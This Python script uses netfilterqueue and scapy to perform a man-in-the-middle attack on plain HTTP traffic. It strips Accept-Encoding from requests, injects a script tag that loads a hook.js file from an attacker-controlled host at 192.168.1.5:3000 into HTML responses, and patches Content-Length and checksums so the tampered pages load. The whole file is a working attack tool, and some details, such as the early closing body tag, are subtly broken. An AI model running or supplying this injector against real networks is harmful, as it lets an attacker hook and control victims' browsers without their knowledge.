import netfilterqueue
import scapy.all as scapy
import re


# only work with http


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # 301 move permanently redirect link to the location we set
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = str(scapy_packet[scapy.Raw].load)
        if scapy_packet[scapy.TCP].dport == 80:  # dport = http (port 80)
            print("[+] REQUEST")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] RESPONSE")
            inject_code = '<script src="http://192.168.1.5:3000/hook.js"></script>'
            load = load.replace("<body>", "<body>" + inject_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(inject_code)
                load = load.replace(content_length, str(new_content_length))
                print(content_length)
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
